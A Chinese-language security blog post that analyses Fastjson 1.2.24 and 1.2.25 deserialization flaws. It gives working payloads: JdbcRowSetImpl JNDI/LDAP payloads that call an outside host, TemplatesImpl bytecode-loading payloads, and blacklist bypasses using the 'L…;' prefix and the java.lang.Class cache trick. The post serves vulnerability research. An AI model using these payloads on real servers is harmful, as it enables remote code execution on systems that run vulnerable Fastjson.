Fastjson漏洞分析续这篇文章分析24、25版本漏洞产生的原因以及POC。 1.2.241.2.24的漏洞分析，上一篇文章已经分析过了，我们来看一下exp。 出网1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://xxx/obj&quot;,&quot;autoCommit&quot;:true&#125; 这个poc就是利用了com.sun.rowset.JdbcRowSetImpl类的setAutoCommit和setDataSourceName。第一步将dateSource设置为远程的值。 先走到setAutoCommit，因为conn为null，会请求connect，第二步请求loop函数。 不出网TemplatesImpl不出网这里利用了TemplatesImpl类去加载字节码。先写一个正常使用TemplatesImpl执行字节码的程序； 1234567891011ClassPool pool = ClassPool.getDefault();CtClass cc = pool.get(&quot;org.fvuln.fastjson24.test&quot;);byte[] b = cc.toBytecode();System.out.println(JSON.toJSONString(b));TemplatesImpl obj = new TemplatesImpl();setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;b&#125;);setFieldValue(obj, &quot;_name&quot;, &quot;123&quot;);setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());obj.getOutputProperties();System.out.println(JSON.toJSONString(new TransformerFactoryImpl())); org.fvuln.fastjson24.test是一个正常的测试代码内容如下 123456789101112131415161718192021222324252627package org.fvuln.fastjson24;/** * author: f19t * Date: 2023/7/19 15:46 * File: test.java */import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class test extends AbstractTranslet &#123; public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; public test() &#123; super(); System.out.println(&quot;test&quot;); &#125;&#125; 运行结果如下： 可以发现JSON.toJSONString会将二进制数组转换成base的编码。 然后我们构造json的exp运行一下： 1234567String s = &quot;&#123;
&quot; + &quot;\&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,
&quot; + &quot;\&quot;_bytecodes\&quot;: [ \&quot;\&quot;
&quot; + &quot;],
&quot; + &quot;\&quot;_name\&quot;: \&quot;aaa\&quot;, \&quot;_tfactory\&quot;: &#123;\&quot;errorListener\&quot;:&#123;\&quot;$ref\&quot;:\&quot;@\&quot;&#125;,\&quot;featureManager\&quot;:&#123;&#125;&#125;, \&quot;_outputProperties\&quot;: &#123;&#125;
&quot; + &quot;&#125;&quot;;JSON.parseObject(s); 发现是无法执行字节码的，这是因为之前1.2.24分析的那三个for循环只能设置public类型的值，虽然这里我们可以调用_outputProperties的get方法，但是由于_bytecodes这些都是private所以无法成功执行字节码。 1JSON.parseObject(s, Feature.SupportNonPublicField); 这样调用就可以成功执行字节码了，盲猜是让赋值支持不是public类型的。 1.2.2525版本对比24版本可以发现多了一个config.checkAutoType(typeName);并且默认AutoType为关闭状态。 AutoType打开时进入到config.checkAutoType(typeName);会进行白名单检测然后进行黑名单检查，不在白名单里面的会继续向下走。如果是白名单内部的直接进行类加载，就不检测黑名单了 如果没在白名单里面，会继续走到类加载这个地方最后return。 这里需要注意的是黑名单检测的className是我们json里面的字符串 而最终获得的类是 1clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader); 调用TypeUtils.loadClass会将我们写的一些bypass给还原。 不出网poc123456789 String s = &quot;&#123;
&quot; + &quot;\&quot;@type\&quot;: \&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\&quot;,
&quot; + &quot;\&quot;_bytecodes\&quot;: [ \&quot;\&quot;
&quot; + &quot;],
&quot; + &quot;\&quot;_name\&quot;: \&quot;aaa\&quot;, \&quot;_tfactory\&quot;: &#123;\&quot;errorListener\&quot;:&#123;\&quot;$ref\&quot;:\&quot;@\&quot;&#125;,\&quot;featureManager\&quot;:&#123;&#125;&#125;, \&quot;_outputProperties\&quot;: &#123;&#125;
&quot; + &quot;&#125;&quot;; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); JSON.parseObject(s, Feature.SupportNonPublicField);&#125; 出网poc123ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String s1 = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://xxxx/obj\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;JSON.parseObject(s1); AutoType关闭时进入到config.checkAutoType(typeName);里面可以发现，当AutoType关闭时会进行黑名单与白名单检测。默认白名单为空。 如果没有生成clazz那么就会报错退出 出网POC先看poc 12String s2 = &quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot; &#125;,&#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;: \&quot;ldap://1.2.24.map.pxe5l5.ceye.io/Object\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;;JSON.parseObject(s2); 第一个json对象json字符串里面有两个json对象。第一个json对象首先获取到clazz&#x3D;java.lang.Class。 之后通过deserializer.deserialze成obg 在deserializer.deserialze方法里面objVal变量的值设置为了com.sun.rowset.JdbcRowSetImpl 最后通过下面的方法返回获取的对象。 1return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader()); 这里的类也就被加到mappings里面了。 第二个json对象还是继续走到checkAutoType，因为AutoType为false所以会直接走到下方。 走到下方的map这个位置直接就获取到clazz了，后面就没有什么了。 直接return了。 后面的过程就和1.2.24一样了。 不出网POC12345678910String s3 = &quot;&#123;
&quot; + &quot; &#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\&quot;val\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot; &#125;,
&quot; + &quot; &#123;
&quot; + &quot;\&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,
&quot; + &quot;\&quot;_bytecodes\&quot;: [ \&quot;\&quot;
&quot; + &quot;],
&quot; + &quot;\&quot;_name\&quot;: \&quot;aaa\&quot;, \&quot;_tfactory\&quot;: &#123;\&quot;errorListener\&quot;:&#123;\&quot;$ref\&quot;:\&quot;@\&quot;&#125;,\&quot;featureManager\&quot;:&#123;&#125;&#125;, \&quot;_outputProperties\&quot;: &#123;&#125;
&quot; + &quot;&#125;
&quot; + &quot;&#125;&quot;; JSON.parseObject(s3, Feature.SupportNonPublicField); 还是一样需要注意设置Feature.SupportNonPublicField。
